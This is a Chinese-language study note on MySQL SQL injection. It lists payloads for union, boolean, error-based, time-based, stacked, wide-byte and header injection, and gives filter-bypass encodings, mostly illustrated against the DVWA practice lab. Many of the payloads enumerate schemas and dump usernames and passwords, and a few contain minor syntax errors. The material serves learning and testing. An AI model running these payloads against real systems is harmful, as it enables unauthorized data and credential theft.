# 一、MYSQL的三个重要表
MYSQL 5.0之后版本
1. information_schema中的SCHEMATA
表中存储该用户创建的所有数据库表名
2. information_schema中的TABLES
表中创建了用户所有的数据库的库名字和表名
3. information_schema中的COLUMNS
表中存储了用户创建的所有数据库库名、表名、字段名。

# 二、mysql的注释符
1. #
2. --空格
3. /**/
4. 内联注释。

# 三、SQL注入
## 1. 字符型注入和数字型注入
### 1. 数字型注入
#### 3.1.1 判断是否存在注入
     1 or 1=1
#### 3.1.2 猜解SQL查询语句中的字段数
     1 order by 2 #
#### 3.1.3 确定显示的字段顺序
     1 union select 1,2 #
#### 3.1.4 获取当前数据库
     1' union select 1,database() #
#### 3.1.5 获取数据库中的表
     1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
#### 3.1.6 获取表中的字段名
     1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #
#### 3.1.7 下载数据
    1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #
### 2. 字符型注入（mysql为例）
#### 3.2.1 判断是否存在注入 
     1’and ‘1’ =’1
#### 3.2.2 猜解SQL查询语句中的字段数
     1' or 1=1 order by 1 #
#### 3.2.3 确定显示的字段顺序
     1' union select 1,2 #
#### 3.2.4 获取当前数据库
     1' union select 1,database() #
#### 3.2.5 获取数据库中的表
     1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
#### 3.2.6 获取表中的字段名
     1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #
#### 3.2.7 下载数据
     1' union select group_concat(user_id,first_name,last_name),group_concat(password) from users #

# 四、注入漏洞类型
## 1. Union 注入攻击(以数字型为例)
### 1.1利用Union注入获取database()
id=1 union select 1,database(),3 并不返回数据库，是因为第一个语句执行成功返回，第二个就不返回了，可以使id=-1，这样第一个就没有查到，从而不反回数据，代码为id=-1 union select 1,database(),3 从而继续执行下个语句。
## 2 Boolean 注入攻击(以数字型为例)
### 2.1 判断信息
访问id=1' and 1=1 # ,只返回yes或者no
### 2.2 获取数据库的长度
     1' and length(database())>=1#
遍历1，当页面不反回，或者返回空白，或错误，数据库长度就是它。e.g.:dvwa中1' and length(database())>=5# 时不反回数据，说明数据库是4个字母。
### 2.3 获取数据库的表名
     1' and substr(database(),1,1)='a'#
使用substr，意思是截取databsae()的值，从第一个字符开始，每次只返回一个。
当然也可以使用ASCII码的字符进行查询，mysql中的查询函数是ord，如下所示
     1' and ord(database(),1,1)='1'#
     另一种方式。1' and substr(database(),1,1)='1'--+
### 2.3 获取数据库的库名
     1' and substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1,1)='g'#
     获取dvwa库第一个表的第一个字母，当然也可以用ASCII码或者用--+注释。
## 3 报错注入攻击
### 3.1 利用报错获取user()
    1' and updatexml(1,concat(0x7e,(select user()),0x7e),1)#
其中0x7e是~的ASCII编码，当然也可以获取数据库名。
## 4 时间注入攻击
### 4.1 时间盲注与Boolean的区别
时间注入是利用sleep()或者benchmark()等函数让mysql的执行时间变长。
### 4.2 时间盲注相关函数
时间盲注多与IF(expr1,expr2,expre3),表示如果expre是TRUE,则IF返回expr2，否则就返回expr3。e.g.：1' and if(length(database())>1,sleep(5),1)#,表示，如果数据库库名长度大于1，则MYSQL查询休眠5秒，否则查询1
### 4.3时间盲注获取库名
     1' and if(substr(database(),1,1)='d',sleep(5),1)#
如果数据库的第一个字母是d则休眠5秒。
## 4 堆叠查询注入攻击
### 4.1 堆叠查询原理
堆叠查询可以执行多条语句，使用逗号隔开。堆叠就是利用这个特点，在第二个SQL语句构造自己的语句。
### 4.2 堆叠查询判断
id=1'错误，id=1#返回正常。这里存在Boolean注入，时间注入
### 4.3 堆叠查询注入语句
     1';select if(substr(user(),1,1)='r',sleep(3),1)#
第二条语句为select if(substr(user(),1,1)='r',sleep(3),1)就是时间注入语句。
## 5 二次注入
### 5.1 二次注入原理
分两步，第一步注册用户名，即插入SQL的地方，第二部通过参数ID读取用户名的用户信息，即执行插入SQL语句的地方。
## 6 宽字节注入
### 6.1 宽字节注入原理
当访问id=1'时，返回1\'多返回了一个‘\’。当数据库编码为GBK时，若存在注入可以使用宽字节注入。宽字节注入是先加个%df，再加单引号，因为反斜杠的编码为%5c，而GBK编码中%df%5c是繁体字“连”，所以单引号成功逃逸，从而使数据库报错。
### 6.2 宽字节注入语句
    1%df' union select 1,user(),3,#
## 7 cookie注入
### 7.1 cookie注入原理
交的参数以cookie方式提交，造成的注入。
## 8 base64注入攻击
### 8.1 base64注入攻击原理
参数提交时经过了beas64编码。
## 9 XFF注入攻击
### 9.1 XFF注入攻击原理
HTTP请求头X-Forwarded-For简称XFF表示客户端的I，通过注入修改X-Forwarded-For可造成注入。
# 五、SQL注入绕过技术
## 5.1 大小写绕过注入
## 5.2 双写绕过注入
## 5.3 编码绕过注入
1. URL全编码两次
     e.g.：and一次完全编码为：%61%6e%64

     二次完全编码为：%25%36%31%25%36%65%25%36%34

     注入代码为：1 %25%36%31%25%36%65%25%36%34 1 = 1 

## 5.4 内联注释绕过
测试代码：id = 1 /*!and*/ 1=1  和 id = 1 /*!and*/ 1=2